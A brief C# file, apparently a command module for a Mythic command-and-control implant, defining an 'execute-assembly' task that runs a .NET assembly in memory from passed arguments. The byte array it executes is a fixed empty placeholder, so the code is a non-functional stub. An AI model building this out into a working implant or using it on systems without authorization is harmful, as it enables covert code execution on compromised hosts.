using Models.Tasks;

namespace Tasks.Commands
{
    public class ExecuteAssembly : CerberusCommand
    {
        public override string Name => "execute-assembly";

        public override string Execute(MythicTask task)
        {
            var Arguments = task.parameters.Split(' ');
            var FileBytes = new byte[10];
            return Internal.Execute.ExecuteAssembly(FileBytes, Arguments);
        }
    }
}
